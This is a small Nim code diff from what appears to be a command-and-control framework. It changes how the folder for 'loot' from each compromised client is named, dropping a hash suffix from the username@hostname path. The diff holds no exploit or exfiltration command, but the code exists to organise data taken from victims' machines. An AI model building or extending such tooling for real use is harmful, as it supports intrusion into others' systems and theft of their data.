@@ -13,7 +13,7 @@ type
     data*: string
 
 proc getLootDirectory*(client: C2Client): string = 
-  result = fmt"loot/{client.username}@{client.hostname} ({client.hash[0 .. 4]})"
+  result = fmt"loot/{client.username}@{client.hostname}"
 
 proc createLootDirectories*(client: C2Client) =
   let rootDirectory = getLootDirectory client
